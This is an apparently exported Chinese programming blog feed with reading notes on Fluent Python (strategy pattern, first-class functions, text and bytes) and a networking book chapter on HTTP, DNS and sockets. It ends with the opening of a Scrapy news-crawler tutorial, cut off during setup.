在复杂的情况下，需要具体策略维护内部状态时，可能需要把“策略”和“享元”模式结合起来。但是，具体策略一般没有内部状态，只是处理上下文中的数据。此时，一定要使用普通的函数，别去编写只有一个方法的类，再去实现另一个类声明的单函数接口。函数比用户定义的类的实例轻量，而且无需使用“享元”模式，因为各个策略函数在 Python 编译模块时只会创建一次。普通的函数也是“可共享的对象，可以同时在多个上下文中使用” 至此，我们使用函数实现了“策略”模式，接下来我们会在此基础上讲如何利用一致的条件选择最佳的策略。 选择最佳策略的简单方法(暴力迭代)使用暴力迭代的话，这个最佳策略选择的实现异常简单: 1234promos = [fidelity_promo, bulk_item_promo, large_order_promo]def best_promo(order): """选择可用的最佳折扣""" return max(promo(order) for promo in promos) 这样直接将best_promo作为参数传入Order类就行。不过这样做的缺陷是:添加新的策略要定义新的函数，并加进promos列表，否则不在best_promo的选择范围内。 找出模块中的全部策略既然说到对模块中函数的遍历，就不得不提到模块的内省函数globals(),这样一说我们就知道，模块也是一等对象（。。。。 这样我们有了新的best_promo: 123456promos = [globals()[name] for name in globals() if name.endswith('_promo') and name != 'best_promo']def best_promo(order):"""选择可用的最佳折扣""" return max(promo(order) for promo in promos) 另一种方法是，在一个单独的模块(promotions.py)中保存所有策略函数，把best_promo排除在外。 12345promos = [func for name, func in inspect.getmembers(promotions, inspect.isfunction)]def best_promo(order): """选择可用的最佳折扣""" return max(promo(order) for promo in promos) 这个实现的缺陷是，promotions模块中的所有函数必须是策略函数，这种实现是强调模块内省的一种用途而不是提供完善的方案。 总结使用一等对象实现策略模式的核心思想是: 用”使用普通的函数”的方式代替”编写只有一个方法的类，再去实现另一个类声明的单函数接口”。将普通的函数作为可共享的对象。 上面的例子都是基于这一思想进行优化，并且处使用一等对象的特性(函数作为参数、模块内省)。 下一篇我们会讲到命令模式，关于策略模式和命令模式的定义和场景，参见：关于设计模式：策略模式和命令模式 （今天好高产]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>design pattern</tag>
        <tag>The Strategy pattern</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第五章小记]]></title>
    <url>%2F2017%2F12%2F13%2Ffluent-python-5%2F</url>
    <content type="text"><![CDATA[Fluent Python 第五章读书报告 Chapter 5. First Class Functions第五章. 一等函数首先解释一下标题的含义:编程语言理论家把“一等对象”定义为满足下述条件的程序实体： 在运行时创建 能赋值给变量或数据结构中的元素 能作为参数传给函数 能作为函数的返回结果 在Python中，整数、字符串和字典都是一等对象，特别提到的是，函数也是一等对象，这一特性称为一等函数。 把函数视作对象12345&gt;&gt;&gt; print.__doc__"print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False)\n\nPrints the values to a stream, or to sys.stdout by default.\nOptional keyword arguments:\nfile: a file-like object (stream); defaults to the current sys.stdout.\nsep: string inserted between values, default a space.\nend: string appended after the last value, default a newline.\nflush: whether to forcibly flush the stream."&gt;&gt;&gt; type(print)&lt;class 'builtin_function_or_method'&gt; 由上面的控制台输出可以看到函数print有一个名为__doc__的属性, 同时是builtin_function_or_method的一个实例。 12345678&gt;&gt; def plus(a):... return a+1...&gt;&gt;&gt; map(plus, range(10))&lt;map object at 0x109553c50&gt;&gt;&gt;&gt; list(map(plus, range(10)))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 由上面的控制台输出可以看到函数是可以作为参数被传递的。有了一等函数，就可以使用函数式编程。 高阶函数接受函数为参数，或者把函数作为结果返回的函数是高阶函数（higher-orderfunction），第一节中提到的map就是一个高阶函数。 常见的高阶函数函数式语言通常会提供map、filter和reduce这三个高阶函数。 在Python中，map/filter有更好用的替代品，Python2中map/filter返回的是列表，所以比较好的替代品是列表推导，Python3中这两个函数的返回则是生成器，所以比较好的替代是生成器表达式 reduce比较特别： 1234567&gt;&gt;&gt; from functools import reduce &gt;&gt;&gt; from operator import add &gt;&gt;&gt; reduce(add, range(100)) 4950&gt;&gt;&gt; sum(100)4950 sum 和 reduce 的通用思想是把某个操作连续应用到序列的元素上，累计之前的结果，把一系列值归约成一个值。类似的归约函数还有all()和any(), all()传入一个可迭代对象，若所有元素都为True,返回True,否则返回False; 而any()只要有一个True就返回True。 匿名函数为了使用高阶函数，有时创建一次性的小型函数更便利， 这便是匿名函数的由来。 lamda函数就是在python表达式内创建匿名函数，但由于句法的限制，lambda函数的定义体只能用纯表达式。 “Functional Programming HOWTO” 中提到，如果使用lambda表达式使得代码难以理解，建议按下面的步骤重构: 编写注释，说明lambda表达式的作用 研究注释，用一个名称概括 用这个名称定义一个函数，把lambda表达式转换成这个函数 删除注释 可调用对象Python 的数据模型文档指出了7种可调用对象： 用户定义的函数: 使用lambda表达式或者def语句创建 内置函数: 使用CPython实现的函数 内置方法: 使用C语言实现的方法 方法: 类的定义题中实现的函数 类: 调用时会创建一个实例，然后执行构造函数 类的实例: 如果类定义了__call__方法，那么它的实例可以作为函数调用。 生成器函数: 使用了yeild关键字的函数或方法, 返回生成器对象。 用户定义的可调用类型不仅python函数式对象，对象也可以表现得像函数，只需要实现方法__call__。 12345678910111213import randomclass BingoCage: def __init__(self, items): self._items = list(items) random.shuffle(self._items) def pick(self): try: return self._items.pop() except IndexError: raise LookupError('pick from empty BingoCage') def __call__(self): return self.pick() 这样调用BingoCage的实例时，效果和调用pick方法一样。 实现 __call__ 方法的类是创建函数类对象的简便方式，此时必须在内部维护一个状态，让它在调用之间可用，例如 BingoCage 中的剩余元素。装饰器就是这样。装饰器必须是函数，而且有时要在多次调用之间“记住”某些事 [ 例如备忘（memoization），即缓存消耗大的计算结果，供后面使用 ]。 创建保有内部状态的函数，还有一种截然不同的方式 —— 使用闭包。 从定位参数到仅限关键字参数Python提供了极为灵活的参数处理机制，Python3提供了 keyword-only argument。调用函数时使用和展开可迭代对象，映射到单个参数。 下面的例子中，tag函数用于生成html标签 123456789101112131415def tag(name, *content, cls=None, **attrs): """生成一个或多个HTML标签""" if cls is not None: attrs['class'] = cls if attrs: attr_str = ''.join(' %s="%s"' % (attr, value) for attr, value in sorted(attrs.items())) else: attr_str = '' if content: return '\n'.join('&lt;%s%s&gt;%s&lt;/%s&gt;' % (name, attr_str, c, name) for c in content) else: return '&lt;%s%s /&gt;' % (name, attr_str) 下面是这个函数的几种调用方式 12345678910111213141516171819&gt;&gt;&gt; tag('br')'&lt;br /&gt;'&gt;&gt;&gt; tag('p', 'hello')'&lt;p&gt;hello&lt;/p&gt;'&gt;&gt;&gt; print(tag('p', 'hello', 'world'))&lt;p&gt;hello&lt;/p&gt;&lt;p&gt;world&lt;/p&gt;&gt;&gt;&gt; tag('p', 'hello', id=33)'&lt;p id="33"&gt;hello&lt;/p&gt;'&gt;&gt;&gt; print(tag('p', 'hello', 'world', cls='sidebar'))&lt;p class="sidebar"&gt;hello&lt;/p&gt;&lt;p class="sidebar"&gt;world&lt;/p&gt;&gt;&gt;&gt; tag(content='testing', name="img")'&lt;img content="testing" /&gt;'&gt;&gt;&gt; my_tag = &#123;'name': 'img', 'title': 'Sunset Boulevard',... 'src': 'sunset.jpg', 'cls': 'framed'&#125;&gt;&gt;&gt; tag(**my_tag)'&lt;img class="framed" src="sunset.jpg" title="Sunset Boulevard" /&gt;' 获取关于参数的信息这里举一个处理web请求的例子: 12345import bobo@bobo.query('/')def hello(person): return 'Hello %s!' % person 在上面这段代码中，bobo是一个web微框架，bobo.query()装饰器将hello()函数与请求处理机制结合在一起，使得hello()自动接收请求中的person作为参数，若没有person参数，则返回403. 函数对象有个 __defaults__ 属性，它的值是一个元组，里面保存着定位参数和关键字参数的默认值。仅限关键字参数的默认值在 __kwdefaults__ 属性中。然而，参数的名称在 __code__ 属性中，它的值是一个 code 对象引用，自身也有很多属性。 下面举一个clip.py的例子，讲解函数对象用于获取参数信息的属性。 12345678910111213141516def clip(text, max_len=80): """在max_len前面或后面的第一个空格处截断文本 """ end = None if len(text) &gt; max_len: space_before = text.rfind(' ', 0, max_len) if space_before &gt;= 0: end = space_before else: space_after = text.rfind(' ', max_len) if space_after &gt;= 0: end = space_after if end is None: # 没找到空格 end = len(text) return text[:end].rstrip() 我们在控制台输入下面的命令，查看属性 12345678910&gt;&gt;&gt; from clip import clip&gt;&gt;&gt; clip.__defaults__(80,)&gt;&gt;&gt; clip.__code__&lt;code object clip at 0x10dadcc90, file "/Users/NickAl/study/github/readings/Fluent-Python/5. First Class Functions/clip.py", line 2&gt;&gt;&gt;&gt; clip.__code__.co_varnames('text', 'max_len', 'end', 'space_before', 'space_after')&gt;&gt;&gt; clip.__code__.co_argcount2 参数名称在 __code__.co_varnames中，不过里面还有函数定义体中创建的局部变量。因此，参数名称是前 N 个字符串，N的值由 __code\_.co_argcount 确定。顺便说一下，这里不包含前缀为 * 或 ** 的长度可变的参数。参数的默认值只能通过它们在 __defaults__ 元组中的位置确定，因此要从后向前扫描才能把参数和默认值对应起来。 另一种查看属性的方式是，使用inspect 模块 12345678910&gt;&gt;&gt; from clip import clip&gt;&gt;&gt; from inspect import signature&gt;&gt;&gt; sig = signature(clip)&gt;&gt;&gt; sig&lt;Signature (text, max_len=80)&gt;&gt;&gt;&gt; for name, param in sig.parameters.items():... print(param.kind, ':', name, '=', param.default)...POSITIONAL_OR_KEYWORD : text = &lt;class 'inspect._empty'&gt;POSITIONAL_OR_KEYWORD : max_len = 80 inspect.signature 函数返回一个 inspect.Signature 对象，它有一个 parameters 属性，这是一个有序映射，把参数名和 inspect.Parameter 对象对应起来。 inspect.Signature的kind属性有下面5种: POSITIONAL_OR_KEYWORD:可以通过定位参数和关键字参数传入的形参（多数 Python 函数的参数属于此类）。 VAR_POSITIONAL:定位参数元组。 VAR_KEYWORD:关键字参数字典。 KEYWORD_ONLY:仅限关键字参数（Python 3 新增）。 POSITIONAL_ONLY:仅限定位参数；目前，Python 声明函数的句法不支持，但是有些使用 C 语言实现且不接受关键字参数的函数（如 divmod）支持。 函数注解Python 3 提供了一种句法，用于为函数声明中的参数和返回值附加元数据, 这就是注解。在clip.py中声明一个新的函数clip_with_anno, 只在声明时加入注解，其他一样。 12def clip_with_anno(text:str, max_len: 'int &gt; 0' = 80) -&gt; str: 1234&gt;&gt;&gt; from clip import clip_with_anno&gt;&gt;&gt; clip_with_anno.__annotations__&#123;'text': &lt;class 'str'&gt;, 'max_len': 'int &gt; 0', 'return': &lt;class 'str'&gt;&#125; 注解和参数、返回值的对应关系一目了然。然而Python本身对注解没有任何操作。 Python标准库中为支持函数式编程提供的包operator模块下面展示了使用reduce计算阶乘的两种方式，区别是是否使用了operator库。 12345678from functools import reducefrom operator import muldef fact(n): return reduce(lambda a, b: a*b, range(1, n+1))def fact_with_mul(n): return reduce(mul, range(1, n+1)) 上面的例子使用mul避免了lambda表达式的使用。operator还提供了一些有效的函数: attrgetter 与 itemgetter这样获取对象属性和可迭代对象的元素的函数。 methodcaller 创建的函数会在对象上调用参数指定的方法 functools.partialfunctools.partial 这个高阶函数用于部分应用一个函数。部分应用是指，基于一个函数创建一个新的可调用对象，把原函数的某些参数固定。使用这个函数可以把接受一个或多个参数的函数改编成需要回调的 API，这样参数更少. 12345678&gt;&gt;&gt; from operator import mul&gt;&gt;&gt; from functools import partial&gt;&gt;&gt; triple = partial(mul, 3)&gt;&gt;&gt; triple(7)21&gt;&gt;&gt; list(map(triple, range(1, 10)))[3, 6, 9, 12, 15, 18, 21, 24, 27] 小结这一小节主要讲了Python函数的一等性质，即函数也是对象这一概念，并说明了这一性质的一部分应用场景，以及功能有限的lambda函数的一些替代方式。 高强度加班了两周，终终终终于有时间吧这章看完啦 To be continued … 敬请期待]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>functional</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络是怎样连接的 第一章小记]]></title>
    <url>%2F2017%2F11%2F28%2Fhow-network-connects-1%2F</url>
    <content type="text"><![CDATA[《网络是怎样连接的第一章读书笔记》 一. 浏览器生成请求 – 探索浏览器内部概览浏览器发出一个请求会经历下面四步： 生成http请求消息 向DNS服务器查询web服务器的IP（如果使用的是域名） 全世界的DNS服务器接力使得ip查询顺利进行 委托协议栈发送消息 生成http请求消息 URL 统一资源定位符 由协议+地址+路径组成，开头部分决定了协议（“http:”“ftp:”“file:”“mailto:”） 浏览器解析url是将它拆分解析的，如http请求的url,会拆分成http://, 域名/ip, 路径。 文件名为index.html/default.html时可以被省略。 HTTP的基本思路:HTTP 协议定义了客户端和服务器之间交互的消息内容和步骤，客户端发送的请求包含“对什么”（URI）进行什么样的操作(Method)收到HTTP请求后，服务器会根据Method和URI决定“对什么进行什么操作”，然后将结果放在响应消息中返回给客户端，浏览器对返回的消息做出展示，一次HTTP请求就完成了。 生成HTTP请求:http消息在格式上有很严格的规定, 浏览器会按照规范生成请求。请求消息的第一行称为请求行，这行开头的Method决定了”作何种操作”请求消息一般分为三部分Request(请求行), HEADERS(消息头), BODY(消息体)响应消息也分为三部分，分别是STATUS（状态行）, HEADERS(消息头), BODY(消息体) 向DNS服务器查询WEB服务器的IP 局域网和广域网都是基于TCP/IP的思路设计的，简单来说呢就是通过路由器的链接，将小的子网连接成一个大的网络。IP就是分配给计算机的地址。请求通过集线器(Hub)-路由器(Router)-Hub-Router…的方式传输到目的地址。 IP地址的网络号和主机号是由子网掩码决定的，子网掩码为0的部分是主机号, 1对应的位置为网络号。IP 地址的主机号全0表示整个子网，全1表示向子网上所有设备发送包，即“广播”。 域名的作用是方便人，但是路由器处理IP效率更高，所以有了折中的方案 —— DNS 通过DNS 查询IP 地址的操作称为域名解析，因此负责执行解析（resolution）这一操作的就叫解析器（resolver）。DNS解析器包含在系统的socket库中。调用解析器后，解析器会向DNS服务器发送查询消息，然后DNS 服务器会返回响应消息。响应消息中包含查询到的IP 地址，解析器会取出IP地址，并将其写入浏览器指定的内存地址中，这样就完成了一次域名解析。5.浏览器调用解析器时，解析器会委托系统内部的协议栈向DNS服务器发送请求，收到响应消息，解析器读取消息后完成解析，在这个过程中，DNS服务的IP地址也必须知道。 全世界DNS服务器的接力DNS服务器的基本工作来自客户端的查询含有三个信息 域名 Class DNS设计之初为其他网络预留的字段，现在固定IN 记录类型 记录类型 作用 A记录 A（Address） 用来指定主机名（或域名）对应的IP地址记录。 NS记录 NS（Name Server） 域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。 MX记录 MX（Mail Exchanger） 邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。 CNAME记录 CNAME（Canonical Name ） 别名记录，允许您将多个名字映射到同一台计算机。 TXT记录 TXT 一般指某个主机名或域名的说明 DNS 服务器的基本工作就是根据需要查询的域名和记录类型查找相关的记录，并向客户端返回响应消息。 域名的层次结构将全球的所有服务器信息保存在同一台DNS服务器上是不可能的，所以需要将信息分部保存在不同的服务器上。 DNS 服务器中的所有信息都是按照域名以分层次的结构来保存的，以点分隔不同层次，每一个层次称为一个域。 DNS 服务器中，而每个域都是作为一个整体来处理的。一个DNS服务器能存放多个域，而一个域不能分开存放在不同服务器上。 互联网中的域通过创建下级的域来分配给不同的国家、公司和组织使用。 寻找DNS服务器 最上级的域称为根域 用点表示，一般域名中可以省略 上级域名的服务器保存下级域名的服务器信息，逐级查询 另外将根域的服务器信息存在所有的DNS服务器中，这样所有的DNS服务器就能找到根域，在逐级往下查找。 通过缓存加快DNS服务器的响应 如果要查询的域名和相关信息已经在缓存中，那么就可以直接返回响应，接下来的查询可以从缓存的位置开始向下进行。相比每次都从根域找起来说，缓存可以减少查询所需的时间。 并且，当要查询的域名不存在时，“不存在”这一响应结果也会被缓存。这样，当下次查询这个不存在的域名时，也可以快速响应。 为了防止之前查询过的信息发生改变导致解析错误，缓存都有一段时间的有效期。 委托协议栈发送消息数据收发操作概览要发送给Web 服务器的HTTP 消息是一种数字信息（digital data），因此也可以说是委托协议栈来发送数字信息。使用Socket 库来收发数据的操作过程如图。简单来说，收发数据的两台计算机之间连接了一条数据通道，数据沿着这条通道流动，最终到达目的地。 图中所示的通道需要通信双方事先建立, 建立管道的关键在于管道两端的数据出入口，称为套接字。收发数据的操作分为若干个阶段: 创建套接字阶段 —— 服务端先创造套接字，进入等待状态，客户端连接之前创建，为连接做准备 连接阶段 —— 客户端将管道连接到服务端的套接字上 通信阶段 —— 收发数据 断开阶段 —— 由服务端或客户端发起，断开管道，删除套接字 这些操作都是由网络应用委托协议栈进行的。 创建套接字阶段调用socket库创建套接字, 得到一个描述符（连接的唯一标识） 连接阶段，将管道联通调用Socket库中的connect组件进行连接， 需要传入3个参数 描述符 ： 通过描述符使用特定的套接字进行连接 服务器IP : 必要 端口号： 同时指定IP和端口号时，就可以明确识别出服务端的套接字。* 如果说描述符是用来在一台计算机内部识别套接字的机制，那么端口号就是用来让通信的另一方能够识别出套接字的机制. 总而言之，就是当调用connect 时，协议栈就会执行连接操作。当连接成功后，协议栈会将对方的IP 地址和端口号等信息保存在套接字中，这样我们就可以开始收发数据了。 通信阶段： 数据收发管道联通后，事情就变得简单了：将数据放入套接字，数据就会被发送到另一边的套接字。 断开阶段: 收发数据结束Web 使用的HTTP 协议规定，当Web 服务器发送完响应消息之后，应该主动执行断开操作，因此Web 服务器会首先调用close 来断开连接。断开操作传达到客户端之后，客户端的套接字也会进入断开阶段。HTTP 1.1中也存在一次连接中收发多个请求和响应的方法，这种情况，当所有数据请求完后，由客户端断开连接。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>socket</tag>
        <tag>网络是怎样连接的</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第四章小记]]></title>
    <url>%2F2017%2F11%2F26%2Ffluent-python-4%2F</url>
    <content type="text"><![CDATA[Fluent Python 第四章读书报告 Chapter 4. Texts versus Bytes第四章. 文本和字节* 注: 本章中讨论的所有字符和字节的问题以Python3为主Python 3 明确区分了人类可读的文本字符串(text)和原始的字节序列(Bytes)。隐式地把字节序列转换成Unicode文本已成过去。 字符问题字符串是一个相当简单的概念，但是字符的定义比较复杂。Python3的str对象中获取的单个元素是Unicode, 但是Python2的str对象获取的是原始的字节序列。Unicode 标准把字符的标识和具体的字节表述进行了如下的明确区分: 字符的标识，即码位，是 0~1 114 111(0x10fff)的数字（十进制），在 Unicode 标准中以4~6个十六进制数字表示，而且加前缀“U+”。例如，字母 A 的码位是 U+0041，欧元符号的码位是 U+20AC，高音谱号的码位是 U+1D11E。在 Unicode 6.3 中（这是 Python 3.4使用的标准），约 10% 的有效码位有对应的字符。 字符的具体表述取决于所用的编码。编码是在码位和字节序列之间转换时使用的算法。在 UTF-8 编码中，A（U+0041）的码位编码成单个字节 \x41，而在 UTF-16LE编码中编码成两个字节 \x41\x00。再举个例子，欧元符号（U+20AC）在 UTF-8 编码中是三个字节——\xe2\x82\xac，而在 UTF-16LE 中编码成两个字节：\xac\x20。 将码位(code points)转化成字节序列(Bytes)的过程是编码，将字符序列转化为码位的过程是解码。 字节概要 Python 内置了两种基本的二进制序列类型：Python 3 引入的不可变 bytes 类型和 Python 2.6 添加的可变bytearray 类型。 bytes 或 bytearray 对象的各个元素是介于 0~255(0x0~0xff)之间的整数。bytes对象的切片还是bytes对象，最小单位是长度为1的bytes对象. bytearray 对象的切片还是 bytearray 对象。 除了格式化方法（format 和 format_map）和几个处理 Unicode 数据的方法（包括casefold、isdecimal、isidentifier、isnumeric、isprintable 和 encode）之外，str 类型的其他方法都支持 bytes 和 bytearray 类型。这意味着，我们可以使用熟悉的字符串方法处理二进制序列，如 endswith、replace、strip、translate、upper等，只有少数几个其他方法的参数是 bytes 对象，而不是 str 对象。此外，如果正则表达式编译自二进制序列而不是字符串，re 模块中的正则表达式函数也能处理二进制序列. 二进制序列有个类方法是 str 没有的，名为 fromhex: 12bytes.fromhex('31 4B CE A9')b'1K\xce\xa9' 新建bytes或bytearray可以调用各自的构造方法: 一个str对象和一个encoding参数 一个提供0~0xff的整数的可迭代对象 一个实现了缓冲协议的对象(buffer protocol, 例如bytes, bytearray, memory view, array.array) 结构体和内存视图(struct and memory view)struct 模块能处理bytes、bytearray 和 memoryview 对象, 能将打包的字节序列和不同类型字段组成的元组相互转换。memoryview 类不是用于创建或存储字节序列的，而是共享内存，让你访问其他二进制序列、打包的数组和缓冲中的数据切片，而无需复制字节序列。 12345678910111213141516import structfmt = '&lt;3s3sHH' #格式：&lt; 是小字节序，3s3s 是两个 3 字节序列，HH 是两个 16 位二进制整数。with open('filter.gif', 'rb') as fp: img = memoryview(fp.read()) #创建一个内存视图header = img[:10] #header也是一个内存视图bytes(header) # b'GIF89a+\x02\xe6\x00'struct.unpack(fmt, header) # (b'GIF', b'89a', 555, 230) 分别代表文件类型,版本,宽度,高度del header # 删除引用, 释放内存del img 基本的编解码器Python 自带了超过 100 种编解码器（codec, encoder/decoder），用于在文本和字节之间相互转换。每个编解码器都有一个名称，如 ‘utf_8’，而且经常有几个别名，如’utf8’、’utf-8’ 和 ‘U8’。这些名称可以传给open()、str.encode()、bytes.decode() 等函数的 encoding 参数。 123456&gt;&gt;&gt; for codec in ['latin_1', 'utf_8', 'utf_16']:... print(codec, 'El Niño'.encode(codec), sep='\t')...latin_1 b'El Ni\xf1o'utf_8 b'El Ni\xc3\xb1o'utf_16 b'\xff\xfeE\x00l\x00 \x00N\x00i\x00\xf1\x00o\x00' 某些编码（如 ASCII 和多字节的 GB2312）不能表示所有 Unicode字符。然而，UTF 编码的设计目的就是处理每一个 Unicode 码位。 一些典型编码: latin1: 一种重要的编码，是其他编码的基础，例如 cp1252 和 Unicode（注意，latin1 与cp1252 的字节值是一样的，甚至连码位也相同） cp1252:Microsoft 制定的 latin1 超集，添加了有用的符号，例如弯引号和€（欧元）；有些Windows 应用把它称为“ANSI”，但它并不是 ANSI 标准。 cp437: IBM PC 最初的字符集，包含框图符号。与后来出现的 latin1 不兼容。 gb2312:用于编码简体中文的陈旧标准；这是亚洲语言中使用较广泛的多字节编码之一。 utf-8:目前 Web 中最常见的 8 位编码； 与 ASCII 兼容（纯 ASCII 文本是有效的 UTF-8 文本）。 utf-16le: UTF-16 的 16 位编码方案的一种形式；所有 UTF-16 支持通过转义序列（称为“代理对”，surrogate pair）表示超过 U+FFFF 的码位。 编解码中出现的问题UnicodeEncodeError把文本转换成字节序列时，如果目标编码中没有定义某个字符，那就会抛出 UnicodeEncodeError UnicodeDecodeError不是每一个字节都包含有效的 ASCII 字符，也不是每一个字符序列都是有效的 UTF-8 或 UTF-16。因此，把二进制序列转换成文本时，如果假设是这两个编码中的一个，遇到无法转换的字节序列时会抛出 UnicodeDecodeError一些陈旧的8位编码可以解码任何字节序列，不抛出错误，但是会得到无用的输出。 使用预期之外的编码加载模块时抛出的SyntaxErrorPython 3 默认使用 UTF-8 编码源码，Python 2（从 2.5 开始）则默认使用 ASCII。如果加载的 .py 模块中包含 UTF-8 之外的数据，而且没有声明编码，会抛出SyntaxError这个问题可以在文件的前两行加入#encoding:${encoding_name}解决。 找出一个字节序列的编码单纯的字节序列是无法找出编码的，必须通过协议/规定的格式告知解码者。——有些通信协议和文件格式，如 HTTP 和 XML，包含明确指明内容编码的首部。但是字节流也可以通过寻找规则来判断可能的编码: 例如，如果 b’\x00’ 字节经常出现，那么可能是 16 位或 32位编码，而不是 8 位编码方案，因为纯文本中不能包含空字符；如果字节序列b’\x20\x00’ 经常出现，那么可能是 UTF-16LE 编码中的空格字符（U+0020）统一字符编码侦测包 Chardet（https://pypi.python.org/pypi/chardet）就是这样工作的，它能识别所支持的 30 种编码. BOM：有用的鬼符utf-16编码的序列开头会有几个额外的字节，称为BOM，即字节序标记（byte-order mark），指明字节序。小字节序设备中，低8位在前，高8位在后，大字节序的设备则反之。UTF-16 有两个变种：UTF-16LE，显式指明使用小字节序；UTF-16BE，显式指明使用大字节序。如果使用这两个变种，不会生成 BOM与字节序有关的问题只对一个字（word）占多个字节的编码（如 UTF-16 和 UTF-32）有影响。UTF-8 的一大优势是，不管设备使用哪种字节序，生成的字节序列始终一致，因此不需要 BOM。 处理文本处理文本的最佳实践是“Unicode 三明治”（要尽早把输入（例如读取文件时）的字节序列解码成字符串，处理过程全部用字符串，输出时尽量晚编码成字符序列) 文本处理中的一些要点: 需要在多台设备中或多种场合下运行的代码，一定不能依赖默认编码。打开文件时始终应该明确传入 encoding= 参数，因为不同的设备使用的默认编码可能不同。 除非想判断编码，否则不要在二进制模式中打开文本文件；即便如此，也应该使用 Chardet，而不是重新发明轮子。常规代码只应该使用二进制模式打开二进制文件。 为了正确的比较规范化Unicode 字符串在 Unicode 标准中，’é’和 ‘e\u0301’ 这样的序列叫“标准等价物”（canonical equivalent），应用程序应该把它们视作相同的字符。但是，Python 看到的是不同的码位序列，因此判定二者不相等。上述的问题的解决方案是规范化Unicode字符串。通常是使用 unicodedata.normalize 函数提供的 Unicode 规范化。第一个参数是’NFC’、’NFD’、’NFKC’ 和 ‘NFKD’之一。NFC（Normalization Form C）使用最少的码位构成等价的字符串，而 NFD 把组合字符分解成基字符和单独的组合字符。这两种规范化方式都能让比较行为符合预期。NFKC 和 NFKD的首字母缩略词中，字母 K 表示“compatibility”（兼容性）。这两种是较严格的规范化形式，对“兼容字符”有影响。由于这一节的内容的领域偏向性太过严重，一般工作不会见到，只是略作了解，碰到相关问题再细查 支持字符串和字节序列的双模式API正则表达式如果使用字节序列构建正则表达式，\d 和 \w 等模式只能匹配 ASCII 字符；相比之下，如果是字符串模式，就能匹配 ASCII 之外的 Unicode 数字或字母。 123456789101112131415import rere_numbers_str = re.compile(r'\d+')re_words_str = re.compile(r'\w+')re_numbers_bytes = re.compile(rb'\d+')re_words_bytes = re.compile(rb'\w+')text_str = ("Ramanujan saw \u0be7\u0bed\u0be8\u0bef" " as 1729 = 1³ + 12³ = 9³ + 10³.") text_bytes = text_str.encode('utf_8') print('Text', repr(text_str), sep='\n ')print('Numbers')print(' str :', re_numbers_str.findall(text_str)) print(' bytes:', re_numbers_bytes.findall(text_bytes)) print('Words')print(' str :', re_words_str.findall(text_str)) print(' bytes:', re_words_bytes.findall(text_bytes)) 上面这段代码的输出: Text ‘Ramanujan saw ௧௭௨௯ as 1729 = 1³ + 12³ = 9³ + 10³.’Numbers str : [‘௧௭௨௯’, ‘1729’, ‘1’, ‘12’, ‘9’, ‘10’] bytes: [b’1729’, b’1’, b’12’, b’9’, b’10’]Words str : [‘Ramanujan’, ‘saw’, ‘௧௭௨௯’, ‘as’, ‘1729’, ‘1³’, ‘12³’, ‘9³’, ‘10³’] bytes: [b’Ramanujan’, b’saw’, b’as’, b’1729’, b’1’, b’12’, b’9’, b’10’] os函数GNU/Linux 内核不理解 Unicode，对任何合理的编码方案来说，在文件名中使用字节序列都是无效的，无法解码成字符串。在不同操作系统中使用各种客户端的文件服务器，在遇到这个问题时尤其容易出错。为了规避这个问题，os 模块中的所有函数、文件名或路径名参数既能使用字符串，也能使用字节序列。如果这样的函数使用字符串参数调用，该参数会使用sys.getfilesystemencoding() 得到的编解码器自动编码，然后操作系统会使用相同的编解码器解码。这几乎就是我们想要的行为，与 Unicode 三明治最佳实践一致。利用这一特性可以修复一些含有鬼符的文件名。 总结 随着 Unicode 的广泛使用（80% 的网站已经使用 UTF-8），我们必须把文本字符串与它们在文件中的二进制序列表述区分开，而 Python 3 中这个区分是强制的。 这一部分要解决的问题大多是一些由于地区/语言不通造成的编码差异，这种差异可以通过规范化Unicode解决,也可以通过规范化编码解决。 Unicode 异常复杂，充满特殊情况，而且要覆盖各种人类语言和产业标准策略。所以要做到完美的处理非常困难。 Python 3.3 起，创建 str 对象时，解释器会检查里面的字符，然后为该字符串选择最经济的内存布局：如果字符都在 latin1 字符集中，那就使用 1 个字节存储每个码位；否则，根据字符串中的具体字符，选择 2 个或 4 个字节存储每个码位。 Python 3 对 int 类型的处理方式：如果一个整数在一个机器字中放得下，那就存储在一个机器字中；否则解释器切换成变长表述，类似于Python 2 中的 long 类型。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>bytes</tag>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用scrapy搭建一个简单的新闻爬虫]]></title>
    <url>%2F2017%2F11%2F23%2Fscrapy_crawler_01%2F</url>
    <content type="text"><![CDATA[本文介绍了如何使用scrapy搭建一个简单的新闻爬虫。 使用scrapy搭建一个简单的新闻爬虫前段时间面了几家公司的爬虫工程师岗位。所有的公司都会问的一个问题就是: 你使用过哪种爬虫框架？熟练度如何？是否能根据需求修改框架源码？有过分布式爬取的经验吗？每次我遇到这种问题都感到很尴尬 —— 现在主流的爬虫框架大概有Scrapy, PySpider(Python); Nutch, Heritrix(Java) —— 这些我一个都没用过, 目前在线上运行的爬虫全是 requests + json/html/xml 解析。至于分布式爬虫, 由于我目前接触的项目爬取量比较小(200+新闻app，300+新闻媒体微信公众号，300+微博的每日增量爬取), 每天的爬取量一台1核/1G/1M的阿里云足够胜任了, 暂时还用不到分布式爬取…… 另外分布式爬取大多依赖上面提到的框架。 所以我做了一个很艰难的决定！把之前写过的爬虫！用scrapy重新实现一遍！ ……………… 好吧，的确有点艰难…… 所以先从其中一个开始吧。 下面会讲到如何使用scrapy 编写一个网易新闻app的爬虫。 * 我选择了一本参考书籍 《learning scrapy》, 但是这本书爬取的示例网站需要翻墙，所以我只看了框架相关的部分，实际网页解析之类的事情，在修改之前的爬虫的过程中解决。 1. 环境配置我开发使用电脑的是Mac OSX, 但其实在实际的Python开发中, OSX使用的命令和ubuntu/debian大同小异。 安装scrapy 1sudo pip install scrapy 创建工程文件夹 